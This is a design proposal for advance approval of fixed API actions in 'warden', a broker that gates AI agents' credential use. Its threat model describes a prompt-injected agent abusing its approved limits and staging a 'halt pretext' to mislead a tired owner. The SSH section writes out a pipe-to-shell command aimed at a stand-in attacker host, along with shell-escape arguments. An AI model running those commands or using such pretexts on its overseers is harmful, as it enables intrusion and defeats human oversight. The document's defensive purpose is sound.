# Approving specific actions in advance

**Status: proposed. Nothing here is implemented.** Today every request needs a
person, and [the threat model](../threat-model.md), [the design](../design.md)
and [the agent documentation](../agent-usage.md) describe that correctly. They
change only when the code does. Tracking issue:
[#107](https://github.com/pecheriere/warden/issues/107).

## Where this ends up

**What the owner wants.** An agent working while the owner sleeps gets stuck on
a prompt nobody is awake to answer. The owner wants to approve specific requests
or actions in advance, so that it can carry on. This is a real need, and the
owner has stated it.

**What cannot be done safely: answering a prompt nobody foresaw.** No safe
design for that was found. An approval must bind to an exact scope, and a
request not yet known has none. A scope wide enough to include an unforeseen
request is wide enough for a prompt-injected agent to choose what goes in it.
That is what a long grant, an open parameter, a pattern or a shell all come down
to, so they are refused below. **An agent that hits an unforeseen prompt will
still stop and wait for morning.** Nothing in this document changes that.

**What can be done: requests known before bedtime.** The owner can approve
exact, fixed requests in advance, each with a hard limit. This is much narrower
than the need, and it mainly helps with polling a fixed status endpoint or
starting a fixed job. Most of what stops a coding agent (a push, a shell
command, a request whose details it learns during the work) stays stopped.

**If the owner goes ahead, the recommendation is fixed API actions.** They are
the narrowest option that is still useful, they meet every hard rule on the
recommended layout, and the agent writes no part of the request. **Server-side
automation is not the answer to this need.** It does not help with an unforeseen
prompt either, and it holds a standing credential that runs until someone
removes it, which is the always-on access warden exists to avoid. It is worth
comparing only for a job that truly runs on a schedule.

**The choice is the owner's.** [The real cost of each is
below](#the-choice-for-the-owner). In short, fixed actions cost new code in a
security broker, a passkey step each night, and a new way for an agent to do
harm while nobody watches, in exchange for unblocking only what could be written
down in advance.

## The recommended option

1. **Fixed API actions, written by the owner in the vault.** An action is one
   complete HTTP request with a name: method, exact path, exact query and fixed
   body, with no headers beyond its content type and the secret's own. The owner
   defines it in 1Password. The agent asks for a few of them by name, the owner
   approves the set with a passkey, and from then on the agent can say "run
   `nightly-import`" and nothing else. It supplies no byte of the request.
2. **Each approval has hard limits:** one agent, at most 12 hours, at most 8
   actions, a use count on each action, one use at a time, and at least 60
   seconds between uses of an action. It starts when approved. It cannot be
   renewed, extended, edited or repeated.
3. **It is a new, separate kind of object.** It is not a grant, and creating or
   approving ordinary requests never looks at it. With no advance approval,
   every request still needs a person, because that code path does not change.
4. **Assume nobody reads a single notification until morning.** The owner is
   asleep or on a plane. Revoking and alerts help if they happen to be awake,
   but the hard limits must be acceptable by themselves. The test for adding an
   action to a set is: **would I accept this firing every allowed time, at the
   worst possible moment, with no warning?** If not, it stays out.

**Left out on purpose:**

- **SSH of any kind.** Certificates cannot meet the hard rules at all. The relay
  could, with exact commands and a new restricted session type, but warden
  cannot see what a command does, and the recommended layout has no relay. A
  later, separate decision: see [SSH](#ssh).
- **`git push`.** It belongs to
  [#80](https://github.com/pecheriere/warden/issues/80), and pushed code is
  agent-chosen content by nature. See [Git](#git-80).
- **Agent-supplied parameters of any kind**, including query strings, path
  segments, bodies and headers. An open body on an exact path can be the whole
  API: `POST /graphql` is one exact path.
- **Pattern matching, for commands or requests.** It fails in the ways listed
  under [Why matching commands does not
  work](#why-matching-commands-does-not-work).

**What this does not solve.** As said above, an agent still stops at a push, a
shell command or any request whose details it only learns during the work. It
can work locally, record what it needs and ask in the morning. That widens
nothing, and it means the work waits.

## What warden does today

Everything in this section was checked by reading the code at the commit this
document was written on.

| Fact | Where | Why it matters here |
|---|---|---|
| An unanswered request ends after 10 minutes. | `PENDING_TTL_SECS` in [`requests.rs`](../../crates/broker/src/requests.rs) | The owner must be there when the agent asks. This stays. |
| A window is 15 min, 30 min, 1 h or 4 h, capped per item by the vault's `max_window`. | `Window` in [`proto`](../../crates/proto/src/lib.rs); `check_window` in `requests.rs`, called at creation; `check_policy` in [`approval/mod.rs`](../../crates/broker/src/approval/mod.rs), called at begin and finish | The threat model accepts unrevocable certificates *because* windows are at most four hours. That argument must keep holding. |
| An approval's binding is held on the server: token hash, window, fingerprint, destination digest, expiry. | `ApprovalBinding` in [`approval/passkeys.rs`](../../crates/broker/src/approval/passkeys.rs) | The page embeds the digest and the item is re-read at begin and at finish. This pattern extends to a set of actions. |
| **The passkey does not sign the scope.** webauthn-rs generates a random challenge itself. | `start_passkey_authentication` in `passkeys.rs`; `generate_challenge` is private in `webauthn-rs-core` 0.5.5 | "Binds" means the server only accepts this assertion for the stored ceremony. It does not produce a signature over the scope that could be checked later. Anything that says the passkey signs the key or the request is wrong; the threat model's description is the accurate one. |
| API scope is an origin, a path prefix on a segment boundary, and a method list. | `check_url`, `check_method` in [`proxy/rules.rs`](../../crates/broker/src/proxy/rules.rs) | No exact path and no use count exist. |
| **The query, body and most headers are the agent's**, and the query is not audited. | `check_headers`, `decode_body` in `rules.rs`; `CallRecord::new` in [`api.rs`](../../crates/broker/src/api.rs) | An allow-list of method and path leaves all of this open. |
| A call is audited before it is sent, and if that fails it is not sent. The policy and secret are read together at call time and compared with the approved digest. | `call` in `api.rs` | Reused as it is. |
| Revoking refuses new calls and stops a call in flight, but cannot undo what the origin did with it. | `call` in `api.rs`; `CallSlots` in [`proxy/slots.rs`](../../crates/broker/src/proxy/slots.rs) | Stated limit. |
| A certificate has one principal, no critical options, `permit-pty` only, and is issued once, at approval. | `issue` in [`ssh_ca.rs`](../../crates/broker/src/ssh_ca.rs); `ssh_grant` in `approval/mod.rs` | After issue the broker is out of the path: it cannot count, see or stop use ([#35](https://github.com/pecheriere/warden/issues/35)). |
| The relay accepts one session channel per connection, then `shell` or `exec`, and passes the exec bytes unchanged. It also forwards stdin, signals, window changes, a pty and some environment. | Module comment in [`relay/server.rs`](../../crates/broker/src/relay/server.rs) and `exec_request` in [`relay/server/handler/protocol.rs`](../../crates/broker/src/relay/server/handler/protocol.rs); `start` in [`relay/onward.rs`](../../crates/broker/src/relay/onward.rs) | The relay can see a command. Comparing it is not enough, because the command's input stays open. |
| The relay's audit keeps the first 200 characters of a command, with invalid UTF-8 replaced. | `Program::audited` in [`relay/session.rs`](../../crates/broker/src/relay/session.rs) | The log is not an exact record of what ran. |
| The relay is unavailable on the recommended layout. | README's table of setups; "SSH relay targets are not supported" for systemd in the threat model | An SSH design based on the relay does not reach most deployments. |
| A grant belongs to an agent, not a task. Everything running as that OS user shares it. | `agent_grant` in [`requests/grants.rs`](../../crates/broker/src/requests/grants.rs); [#49](https://github.com/pecheriere/warden/issues/49) | See [Who can use it](#who-can-use-it). |
| A notifier failure puts a pending request in `error`. A doorbell always carries a link. | `notify` in [`requests/create.rs`](../../crates/broker/src/requests/create.rs); `Doorbell` in [`notify/mod.rs`](../../crates/broker/src/notify/mod.rs) | A per-use notice has nothing to approve, so `Doorbell` needs a form without a link. |

## Hard rules for any option

These are requirements, not features. An option that breaks one is out.

1. With no advance approval, every request still needs a person.
2. Nothing renews itself.
3. The agent cannot widen or extend it.
4. The owner's passkey binds to the exact scope.
5. There is a hard maximum on duration and on uses.
6. Everything is audited.

## Options

### A. A longer blanket grant

Raise the window beyond 4 hours.

- **Trusts:** the agent, for the whole night, with the whole scope.
- **Fails:** a prompt-injected agent has an unattended shell or API prefix, with
  no limit on uses. The issue rules this out, and it would undo the reason the
  threat model accepts unrevocable certificates.

**Worth noticing:** this is what an owner can already do for up to 4 hours by
approving a grant just before bed. Compared with that, a fixed action lasts
longer but can do far less. Neither replaces the other, and approving an action
set does not end grants that are already live.

### B. API allow-list: exact method and path, with a use count

The agent makes ordinary proxied calls, checked against a list.

- **Trusts:** the origin's method and path to mean what the owner thinks, and
  the agent with everything else in the request.
- **Fails:** the path says little about what a call does.
  - `POST /graphql` is one exact path and the whole API.
  - `POST /v1/issues/7/comments` with an open body can publish anything to
    anyone who can read that issue.
  - `GET /v1/search?q=` reads whatever the query asks for, and the query is not
    audited.
  - A header can change the meaning. `REFUSED_HEADERS` in `rules.rs` is a good
    list, but it is a list of what is known to be dangerous.

  The owner sees a tidy line on the page and has approved far more than it says.

### C. Fixed API actions, defined in the vault (recommended if the owner goes ahead)

One whole request, fixed by the owner, invoked by name. Details are
[below](#design-of-the-first-version).

- **Trusts:** the vault, which is already a root of trust, the origin, and the
  owner's judgment when writing the action.
- **Fails:** the agent chooses *whether*, *when* and *how often* within the
  count, and sees the response. The request is exact; **its effect is not**. See
  [What could go wrong](#what-could-go-wrong). A badly chosen action is the
  owner's mistake and warden cannot detect it.

### D. One-shot pre-approved request, drafted by the agent

The agent writes out one complete request, the owner approves that exact text,
and the agent can send it once.

- **Trusts:** the owner to read an agent-written body on a phone at bedtime.
- **Fails:** the content is the attacker's when the agent is compromised, and a
  long JSON body is exactly where something can hide. The request can also go
  stale in a way that looks harmless: "merge pull request 42" is exact, but the
  agent can push more commits to it first.
- **Good at:** a one-off that nobody could have declared in advance. It is the
  most exact option per use and its limit is plain: one.

### E. A small bundle of named requests

D or C with several entries. The bundle itself adds one thing to worry about:
**combinations**. Two acceptable actions can be harmful together or in the wrong
order (stop a service, then clear its data). Nothing in this design enforces an
order, so the owner must judge the set. This is why C limits a set to 8 and why
the page shows the whole set as one decision.

### F. SSH certificate with `force-command`

The certificate carries `force-command`, which the CA signs, so the agent cannot
change it. `ssh-key`'s `Builder::critical_option` can set it.

- **Trusts:** sshd on every target. OpenSSH documents that a `ForceCommand` in
  `sshd_config` takes the same role, so a target can run something else, and
  warden cannot see that configuration.
- **Fails against the hard rules:**
  - **Uses cannot be limited.** A certificate works for any number of logins
    until it expires, and sshd keeps no count.
  - **Uses are not audited by warden.** It records `cert_issued` and never sees
    a login. The record is in the target's logs.
  - **Revoking does nothing**
    ([#35](https://github.com/pecheriere/warden/issues/35)). Over a 12-hour
    night this is the threat model's accepted risk at three times its accepted
    length.
  - **Stdin stays open.** The command is fixed but its input is the agent's, and
    sshd has no certificate option to close it. If `permit-pty` were kept, so
    would be a pty.
  - **The agent's command is still handed over.** sshd sets
    `SSH_ORIGINAL_COMMAND`. A wrapper that reads it brings back the parsing
    problem the forced command was meant to avoid.
- **A variant:** mint one short certificate per use (say 60 s), so the broker
  counts mints. This narrows it, but a mint is not a use: the certificate can
  log in many times in that minute, and the broker still sees nothing. It also
  changes the decision "one certificate per grant". A counted mint with target
  logs is a weaker claim than a counted use, and the page must not say "3 uses"
  when it means "3 minutes".

**Not recommended, including the variant.**

### G. SSH relay with an exact command

The vault holds one exact command string for a relay target, and the relay
compares the bytes of the `exec` request and sends them on.

- **Trusts:** the target's account, shell and files, as well as the broker,
  which already holds the login credential.
- **Fails:** it satisfies the hard rules, because the broker is in the path: it
  can count, audit and cut a session within about 2 s, or about 5 to 6 s when
  another process revokes. But **what the command does depends on the target,
  and warden cannot see that**. It also needs a new restricted session type,
  because today's relay forwards everything listed above.

Possible later, under the conditions in [SSH](#ssh).

### H. The relay parses and matches commands

A prefix, a pattern or an allowed program with free arguments.

**Rejected,** except for one protocol with a defined grammar, which is
[#80](https://github.com/pecheriere/warden/issues/80)'s git commands. [Why
matching commands does not work](#why-matching-commands-does-not-work) has the
reasons.

### I. No advance approval: server-side automation, and asking in the morning

What must run overnight runs as a scheduled job on a machine the agent cannot
reach. The agent works on what needs no credentials, and asks in the morning for
the rest. Service-side limits still help: a read-only token, a machine account,
branch rules.

- **Trusts:** the machine and the job, which are outside warden. The job holds
  its own standing credential, needs no passkey, runs until someone removes it
  and is not in warden's audit log. warden itself trusts nothing new.
- **Fails:** an agent stuck on a prompt stays stuck until morning, which is the
  need this issue is about. The job's credential is always on, every night,
  whether or not the owner chose that night. A job that reads something the
  agent can change has the same mutable state problem as a fixed action.

Asking in the morning is the baseline: it widens nothing, and the work waits.
Automation is not that baseline. It takes the agent out of the path by adding
always-on access somewhere else, which the owner has said is not acceptable as
an answer. A credential on the agent's own disk is worse, and is out for the
same reason. Narrow service-side tokens are worth having under every option.

### How they compare

| | Limits uses | warden audits each use | Revoke stops new uses | Agent controls | Works on the recommended layout |
|---|---|---|---|---|---|
| A. Longer grant | No | API and relay, not cert | API and relay, not cert | Everything in scope | Yes (API, cert) |
| B. Method and path | Yes | Yes, without query or body | Yes | Query, body, headers, when | Yes |
| I. Automation, or the morning | No limit on the job, whose credential is always on. The agent has no access. | No: the job's own logs | The owner removes the job, outside warden | Nothing, unless it can reach what the job reads | Yes |
| **C. Fixed action** | **Yes** | **Yes, exactly** | **Yes** | **When, how often within the count** | **Yes** |
| D. One-shot, drafted | Yes (one) | Yes, exactly | Yes | The content, before approval | Yes |
| F. `force-command` | **No** | **No** | **No** | Stdin, when, how often | Yes |
| G. Relay, exact command | Yes | Yes | Yes, in seconds | Nothing about the command if restricted; when | **No** |
| H. Relay, matching | Yes | Partly | Yes, in seconds | Whatever the matcher misses | **No** |

### Fixed actions against server-side automation

This compares the two only where automation applies at all. **Neither answers an
unforeseen prompt.**

| Need | Server-side automation | Fixed action | Weighing |
|---|---|---|---|
| A fixed job at a fixed time, such as a nightly import. | Cron, a systemd timer or a CI schedule. The agent has no trigger, but the job's credential is always on. | The agent fires it, up to the count, when it likes. Nothing can fire without tonight's passkey. | **A real trade-off.** Automation is safer from the agent. An action is safer against always-on access. |
| Status that the agent checks while working. | A scheduled job publishes a chosen part of the result where the agent can read it. Standing credential, and the answer is as old as the schedule. | The agent receives the whole response, whenever it asks, within the count. | **A trade-off.** The agent sees less with automation, and gets a fresher answer with an action. |
| A job to run once the agent's work is ready. | Service-side triggers, such as CI on a push, or a worker watching for a marker. The agent then holds the trigger anyway, and a limit on runs must live in the job. | A count, a passkey for this night and warden's audit, in one place, with no new worker. | **Action.** |
| An API with no schedule or trigger of its own, and nowhere to run a job. | Needs a machine to be found and a credential placed on it. The warden host is not the place: it should run nothing else untrusted. | Uses the secret warden already holds. | **Action.** |
| Access that exists only on nights the owner chooses. | Not what a schedule does, unless the owner enables it each time. | Nothing can fire until tonight's passkey. | **Action.** |
| Whether to fire a known request, based on what the agent found. | Not possible. | Possible. | **Action, with care.** The agent's judgment is exactly what a prompt injection subverts. |
| **A request nobody foresaw.** | Not possible. | Not possible: the request must exist in the vault. | **Neither.** It waits for morning. |

### The choice for the owner

| Choice | What it gets | What it costs |
|---|---|---|
| **Fixed API actions** (recommended if going ahead) | An agent can carry on past requests that were written down before bed, within hard limits, with passkey consent for that night and every use in warden's audit. | A table, a route, a CLI command, a page, a new kind of notification and a wider threat model, in a security broker, for every owner. A vault item for each action, and a passkey step each night, which can become a habit. An agent that can fire each action at the worst moment, every allowed time, with nobody watching ([What could go wrong](#what-could-go-wrong)). A halt can be used as a pretext. Sessions of one agent share it (#49). The agent needs a non-exportable key, which warden cannot verify. Unforeseen prompts remain stuck. |
| **A read-only first version of the same** | The same for `GET` and `HEAD`, with the harm limited to what those endpoints return. | The same code. Starting a job stays stuck. |
| **No change** | Every request keeps needing a person, and nothing new can go wrong. | An agent stops at any prompt nobody answers, and the work waits for morning. The need stays unmet. |

Before choosing, it helps to name two or three requests that stopped real work
and ask whether each was fully known before bed and would pass the worst-moment
test. In the audit log, `request_created` and `expired` entries show requests
that went unanswered overnight, though an agent that knows nobody is there may
never ask. If they would all need a parameter, a shell or a push, fixed actions
would not have helped, and **the answer is to stay with no change rather than to
loosen this.**

## Design of the first version

### The action

An action is a new item in the vault, so the agent has no say in what it
contains. This is the most important choice in the design. A prompt-injected
agent can make a bad proposal, but only from what the owner wrote calmly,
earlier, somewhere the agent cannot reach. It also makes the feature off by
default: **no action items, no feature**, so no separate switch is needed.

Proposed item (tag `warden:advance-action`; the title is the action's name,
under the same rule as target names):

| Field | Value |
|---|---|
| `secret` | The API secret item it uses, for example `home-api`. |
| `description` | The owner's own words, shown on the approval page. |
| `method` | One method, allowed by that secret, never `CONNECT` or `TRACE`. |
| `path` | One exact path, under the secret's prefix, in the plain form `check_path_prefix` demands. |
| `query` | Optional. The exact query string. |
| `body`, `content_type` | Optional. The exact body, at most 4 KiB so the page can show it whole. |
| `max_uses` | At most 100 for `GET` and `HEAD`, at most 10 for anything else. |
| `max_hours` | The longest approval this action may be part of, at most 12. |
| `ring` | `each` or `first`: whether every use rings, or only the first. `first` is accepted only with `GET` or `HEAD`, and is never assumed from the method. |

As elsewhere, required fields never fall back to a default, and a malformed item
fails with an error naming the field. The path and query must pass the checks in
`rules.rs`.

**An action has no other headers.** The broker sends the secret's header, the
`content_type`, the `Accept-Encoding` it always sets and what HTTP framing
needs, so there is nothing unbound to approve. An API that requires another
header cannot be an action in this version.

The method says little about the effect, since a `GET` can have side effects. So
the higher limit for reads is a heuristic, the page does not call anything
"safe", and how often a use rings is the owner's explicit choice in `ring`.

### Limits

| Limit | Value | Enforced by |
|---|---|---|
| When it starts | At approval. No delayed start. | The approval's stored `not_before`. |
| Longest duration | **12 hours**, a compile-time constant. The owner picks 4, 8 or 12 h, up to the lowest `max_hours` in the set. | Checked at begin and finish, and again on each use. |
| Actions per approval | 8. | Refused when requested. |
| Uses per action | The item's `max_uses`, under a compile-time ceiling. | A conditional update in one transaction. |
| Concurrency | One use at a time per approval. | A slot like `CallSlot`. |
| Spacing | At least 60 s between uses of an action. | Refused with the time remaining. It does not halt anything. |
| Live approvals | One per agent. | Refused when requested. |
| After it ends, for any reason | No new advance request from that agent until the original end time, unless the owner clears this on `/grants` with a passkey. | Refused when requested, and nobody is notified. |
| Renewal | None. Ending is final. | There is no such route or state. |

**How this interacts with the 4-hour cap: it does not.** `Window` is unchanged
and still caps every grant. An advance approval never creates a grant, so it
cannot hold a certificate, a relay session or a prefix-scoped proxy grant open.
It can run past 4 hours because what it allows is counted, which a grant's
window is not.

A delayed start is left out: it adds time between the decision and its effect,
and agents rarely know when they will need something.

### Flow

1. The agent runs something like `warden advance request --action build-status
   --action nightly-import --goal "..."`. Unknown names, or more than the limits
   allow, are refused at once and nobody is notified, as with an out-of-scope
   API request today.
2. It becomes an ordinary pending request: 10-minute expiry, a hashed token, a
   link sent only to the owner's notifier, with a different title. **The owner
   must be there at this moment.**
3. The owner reads the page, picks a duration and approves with a passkey.
4. The agent runs `warden advance use nightly-import`.

**The agent proposes rather than the owner composing on the page**, because that
is the path warden already has and the agent is the one that knows what it
needs. The vault is what bounds the proposal.

**Not by matching.** `Requests::create` and `mark_approved` do not consult
advance approvals. A request the agent makes overnight rings and expires exactly
as it does today, even if an approval covering the same thing is live. This is
what keeps the default unchanged, and it should have a test.

### A separate object, on a separate route

- **Its own table and its own route**, `POST /v1/advance/{id}/use/{action}`,
  which accepts an empty body and refuses anything else. There is no row in
  `grants`, so `agent_grant`, `active_relay_grant` and `POST
  /v1/grants/{id}/http` cannot see it, and a bug in the new path cannot become
  general API access.
- **The request is built only from the stored action.** It still goes through
  `proxy::check`, with the narrowed policy, as a second check. Redaction, the
  refusal of redirects, compression and the size limits stay as they are. The
  one thing the agent receives is the redacted response.
- **The sequence of a use:**
  1. Authenticate the signed request, and confirm the approval belongs to this
     agent.
  2. Read the action and secret together, and compare them with the approved
     digest.
  3. Audit its start with `record` in `requests/transition.rs`, as the log is never
     written during a database write. Then spend the use (`UPDATE … SET used = used +
     1 WHERE used < max AND not_after > now AND ended_at IS NULL`), and say on the
     record if that finds nothing left to spend.
  4. Ring the owner where required (below).
  5. Check again that the approval is still live, since a ring can take several
     seconds and the owner may revoke meanwhile. If it has ended, audit that and
     send nothing.
  6. Send, then audit the result.

  Spending comes first, so a crash loses a use and never grants an extra one. A
  failed call has spent its use. An outage at step 2 refuses without spending.
- **Backups:** restoring an older database restores spent uses. The expiry still
  holds, and the host is the root of trust.

### What the owner sees and signs

The page is visibly different from an ordinary approval and follows
`docs/design-language.md`, so that it does not become a reflex:

- **The headline states the consequence:** "Nobody will be asked again. Until
  07:30, `build-agent` can do the following without asking you."
- **Each action** shows the owner's `description`, then the literal method,
  origin, path, query and body, and the use count: "up to 3 times".
- **The total**, and the test above: "Approve only if you would accept each of
  these at the worst moment, every allowed time."
- **The goal** is labelled as the agent's words, kept apart from the owner's own
  descriptions, and shown with the existing fingerprint. It explains; it never
  decides.
- **Live grants of the same agent** are listed, since they keep running
  alongside.
- **The duration has no preselected value.** The button says "Approve without
  asking again", and needs the passkey.

**Binding.** The digest covers the agent and, for every action, the name, the
secret's destination digest, the description, the method, path, query, body
hash, content type, `max_uses` and `ring`, which is everything the page shows
about it. It is embedded in the page, compared when the ceremony begins, and
added to `ApprovalBinding` with the duration. The action items are re-read at
finish, and any difference asks the owner to reload. Editing an item or its
secret after approval ends the use of that action, as with `destination_digest`
today.

**The limit of that binding.** As with every approval today, the passkey proves
the owner answered this ceremony, not what the page displayed. Whatever
terminates TLS can show one thing and approve another ([owner
identity](owner-identity.md#one-limit-that-is-easy-to-miss-the-tls-terminator-can-swap-an-approval)).
An advance approval raises the value of that swap, and it matters more if
[#75](https://github.com/pecheriere/warden/issues/75) brings in a third party.

### Who can use it

**One named agent, with a signing key that cannot be copied.** A bearer-key
agent is refused: a stolen bearer key can be replayed from any host with the
owner's login.

**A plain signing key in a file is a stronger case for refusal than that.** It
is a credential on the agent's disk. A copy can fire every approved action,
unattended, from any device the network policy lets reach the API, because
signed requests need no owner login ("Key-signed agents need no owner login" in
the threat model). And nobody is watching at the time. So an agent may use
advance approvals only with a non-exportable key, such as one in the Secure
Enclave, a TPM or a PIV token.

**warden cannot verify this.** Enrolment takes a public key line (Ed25519 or
ECDSA P-256, `agents.rs`), which says nothing about where the private half
lives, and the protocol carries no attestation. So the rule rests on the owner's
word: an agent is enrolled for this with an explicit flag, off by default, such
as `warden-server agent add --non-exportable-key`, and the approval page repeats
that statement. A false statement cannot be detected. Whether to allow plain
keys anyway, with the risk stated, is a question for the owner below; the
recommendation is no.

Hardware does not stop code on the agent's machine, which can ask the key to
sign for as long as it runs there. It leaves that attacker nothing to take away,
and revoking the agent ends it.

**[#49](https://github.com/pecheriere/warden/issues/49) is not solved here, and
this must be said plainly.** Every session and process running as the agent's OS
user can spend these uses, and the audit log cannot tell them apart. Flags
cannot enforce a boundary between them, as the comment on #49 says. Only a
per-grant key held in process memory, or a separate OS user, can.

This is acceptable for the first version **because of how narrow it is**.
Another session can only send the same fixed requests, so what it can take is a
use, and what it can do is fire an action early. A separate agent, with its own
OS user, is the recommended setup for overnight work; warden cannot detect
whether it is used. **If this ever gains parameters or SSH, proof of possession
from #49 becomes a prerequisite**, since sessions could then do different
things.

### While it runs

**Audit.** Hash-chained like everything else, with new events for: approved
(digest, passkey, duration, full literal scope with the body as a hash), use
started, use finished (status, bytes, redactions, outcome), use refused (why),
halted (why), revoked (by whom), and ended (expired or used up). Because the
requests are fixed, the entries identify exactly what was sent, query included,
without recording agent data. If an entry cannot be written the use is not sent.

**Notifications.** A notifier is an untrusted doorbell, so a notice carries the
agent, the action's name and the count: `warden: build-agent used nightly-import
(2 of 3). Nobody was asked.` It carries no query, body or description, and no
approval link.

- **A use that rings does so before it is sent. If no channel accepts the
  notice, the use is not sent and the approval halts.** warden then never sends
  such a use after its notifier refused it. That is all this proves: a ring
  means a notifier answered 2xx (`check_status` in `notify/mod.rs`), not that
  the phone got it or anyone saw it. A notifier outage costs the night's work,
  which is the right direction to fail.
- **Which uses ring is written in the item, not guessed from the method.**
  `ring` is `each` or `first`, and `first` needs `GET` or `HEAD`. Every use is
  audited either way. An action may have 100 uses, and the same channel carries
  approval requests: a phone that buzzes all night gets muted, and then the
  agent's next real request goes unseen. The issue asks for a notice for each
  use, so this is an open question below.
- **The end always rings**, whatever the reason, and like every notice here it
  carries no link, so that it cannot lead a tired owner to the step that clears
  the lockout below. The owner reads what happened on `/history`.

**Stopping on something unusual.** warden cannot recognise abuse, because the
requests are the approved ones. It can recognise a few things that a
well-behaved agent would never do. Each of these audits and rings, and nothing
more runs under that action or approval:

| What happened | Effect |
|---|---|
| Asked for an action not in the approval, or past its count | The whole approval halts. |
| A response contained the secret (`redactions > 0`) | The whole approval halts. |
| The origin answered with a redirect | The whole approval halts. |
| The action or the secret changed in the vault | That action stops. |
| A response other than 2xx | That action stops. |

Being too early for the 60 s spacing is refused without a halt, since a retry is
normal.

**A halt is also a pretext, and an agent can trip one on purpose.** Asking for
an action outside the set takes one call. warden then truthfully tells the owner
the approval has stopped, and the agent can follow up: "warden halted the
overnight job, please approve again so it can finish." Everything checkable in
that story is true. Using up the count works the same way. So:

- **No new advance request is accepted after an approval ends**, for any reason,
  until its original end time. It is refused and nobody is notified, so the
  agent cannot put that prompt in front of the owner. The owner can clear this
  on `/grants`, with a passkey, after reading what happened. They have to go
  there themselves: neither a notice nor anything the agent sends links to it.
- **The notice says so:** "This may be the agent's doing. Nothing needs you
  tonight. Read the history first."
- **Every approval page for that agent shows a banner** until that end time,
  naming the halt and its time, which the agent's goal cannot remove.

**This does not close it.** An ordinary request must still ring, or the default
flow would change, so the agent can ask for an ordinary grant with the same
story, and an ordinary grant is much wider than the action was. Only the banner
stands in the way of a tired owner. The agent can also end the night's work
whenever it likes. Both are the price of having halts at all. The alternative is
to refuse an out-of-scope action without halting, which loses a sign of
compromise and removes one pretext but not the others, since upstream failures
and used-up counts remain.

**Revoking.** `/grants` lists live approvals at the top, with uses left and the
time remaining, and with one Revoke that ends the whole approval.

- **New uses** are refused at once, by the same check that spends them.
- **A call in flight stops**, and its response is withheld. Spacing and the
  one-at-a-time rule limit this to one call. It does not undo what the origin
  already did.
- **[#35](https://github.com/pecheriere/warden/issues/35) does not apply**,
  because no certificate exists. This is a large part of why the first version
  is API-only.
- **Revoking the agent** ends it too. **Removing the passkey that approved it
  should also end it,** since that is what an owner who lost their phone does;
  today removing a passkey leaves grants alone, so this is new.
- **Phone gone, or no access:** `warden-server agent revoke` on the host.

### What it must never do

The implementation needs a test for each of these:

- Approve a future request by pattern, or at all. `create` and approve never
  look at it.
- Renew: there is no timer, no rollover, no "same as last night", and a restart
  resumes what is stored and nothing more.
- Let the agent widen or extend it: there is no agent route that changes an
  approval, an agent can only name existing actions, and the route takes an
  empty body.
- Let an action's use produce a grant, certificate or relay session.
- Reach warden itself. An item whose origin is the approval UI, the one address
  warden knows (`WARDEN_PUBLIC_URL`), is refused. warden does not know the name
  its agent API is published under, so it cannot refuse that by itself; a call
  the broker sends there carries no agent signature and is refused with a 401.

## What could go wrong

### A worked example

The owner approves, for 8 hours:

- `build-status`: `GET /v1/builds/latest` on `home-api`, 100 uses.
- `nightly-import`: `POST /v1/jobs/import/run` with a fixed body, 3 uses.

At 02:00 the agent reads a web page or a build log containing injected
instructions. From then on it acts against the owner, staying exactly within
what was approved.

| What it does | Does warden stop it? |
|---|---|
| Runs `nightly-import` three times, 60 s apart, at the worst moment. | **No.** Three rings, then nothing left. This is the approved limit. |
| Triggers it after changing what the job reads, through some other access it has. | **No.** The request is exact and the effect is not. This is the most serious case. |
| Reads `build-status` and sends the content out over its own network. | **No.** warden does not control the agent's other network access, and a response is the agent's to read. |
| Reads something in the response that contains more injected instructions. | **No.** Responses are untrusted input to the agent. |
| Never runs the action it was meant to, or runs it too late, so a job silently does not happen. | **No.** Approval cannot require anything to happen. |
| Runs the two actions in an order the owner did not expect. | **No.** No order is enforced. |
| Lets another session of the same agent do any of this. | **No**, see [#49](https://github.com/pecheriere/warden/issues/49). The audit log cannot tell them apart. |
| Costs money, if the API bills per call. | **Bounded** by the count. |
| Changes a query, body or header. | **Yes.** It supplies none of them. |
| Reaches another path, method or origin. | **Yes.** |
| Fires a fourth time, or after the end. | **Yes.** A fourth use also halts the approval. |
| Uses this to get a grant, a shell or a secret. | **Yes.** The secret stays in the broker, and the same redaction limits apply as in proxy mode. |
| Asks for more, with a persuasive goal, at 03:00. | **Partly.** It is an ordinary request that rings and needs a passkey. A tired owner who approves it has approved it. Nothing extends an approval, and a new advance request is refused after one ends. But a halt it caused is real, so its story can be true in every checkable detail, and it can ask for an ordinary grant. See [the halt pretext](#while-it-runs); the banner is the only thing warden adds. |

### Is that acceptable?

**For a read of low-value data: yes.** The harm is limited to what that endpoint
returns, and the owner could look at that when choosing it.

**For a fixed write: only under the test.** Whether a write is acceptable
depends on the action, and warden cannot judge that. It is fine for an
idempotent job whose worst outcome is a re-run. It is not fine for anything that
sends messages to people, spends meaningfully, deletes, deploys to production or
changes access. **Deploying is the trap:** "deploy what is on `main`" looks
fixed, but does whatever `main` now holds, and an agent that can push can decide
that. Whatever the action reads must be beyond the agent's reach, or the action
should be treated as giving the agent that power.

**For SSH commands and open parameters: not on this evidence**, which is why
they are out.

### What cannot be enforced

- **What a request or command does at the far end,** or whether it is
  idempotent, or what `GET` really means on that API.
- **Mutable state behind a fixed action:** a job's input, a branch's content, a
  config file.
- **Timing and intent.** warden knows a use happened. It cannot know whether it
  was wise.
- **Data after it reaches the agent.**
- **The owner's attention,** at approval or afterwards. Nightly approvals can
  become a habit, and warden has no defence but to make each one a deliberate
  step. It deliberately offers no shortcut to repeat the last one.
- **Separation between sessions of one OS user.**
- **The action's quality.** A vault item can fix a request that is dangerous by
  itself, such as a fixed body that grants access. The vault is trusted to mean
  it.

## SSH

Left out of the first version on purpose. If it comes later, it should be its
own issue with its own threat model change, and it should follow these
conditions.

### Why matching commands does not work

The bytes of an `exec` request reach the target's login shell, run with `-c`. A
check in the relay and the shell on the target are two different parsers, and
only one of them decides what happens.

| Approach | What defeats it |
|---|---|
| **Prefix or substring** | `systemctl status app; curl https://attacker.example \| sh`. Also `&&`, `\|\|`, `\|`, `&` and newlines. |
| **Refusing metacharacters** | Fine until `$(...)`, backticks, `>`, `<`, globs, `$IFS`, `\`-newline and `~`, and the rules differ by login shell: bash, dash, fish, csh, BusyBox ash. An account's shell can change. |
| **Program name with free arguments** | The arguments are the program. `find / -exec sh -c '...' \;`, `git -c core.sshCommand=... fetch`, `tar --to-command=sh`, `rsync -e sh`, `awk 'BEGIN{system("sh")}'`, GNU `sed` with `e`, `python -c`, `make -f`, `docker run -v /:/host`, `sudo`. The GTFOBins project lists hundreds. |
